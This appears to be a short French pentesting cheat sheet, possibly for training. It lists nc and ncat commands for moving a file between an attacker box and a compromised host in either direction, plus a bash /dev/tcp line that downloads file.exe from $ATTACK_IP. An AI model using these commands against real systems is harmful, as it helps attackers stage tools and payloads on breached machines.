---
public: true # set to true to make the article publishable
---

| Attackbox   ENVOIE file.exe vers | Compromised host |
| --- |  --- | 
| ETABLIT LA CONNEXION |  | 
| `nc -q 0 $TARGET_IP 443 < file.exe` | `nc -l -p 443 > file.exe`| 
| `ncat --send-only $TARGET_IP 443 < file.exe` | `ncat -l -p 443 --recv-only > file.exe`| 

| Attackbox   ENVOIE file.exe vers | Compromised host |
| --- |  --- | 
|  | ETABLIT LA CONNEXION | 
| `nc -l -p 443 < file.exe` | `nc -q 0 $TARGET_IP 443`| 
| `ncat -l -p 443 --send-only < file.exe` | `ncat --recv-only $TARGET_IP 443 > file.exe`| 


```
# se connecte à $ATTACK_IP et download file.exe
cat < /dev/tcp/$ATTACK_IP/443 > file.exe
```
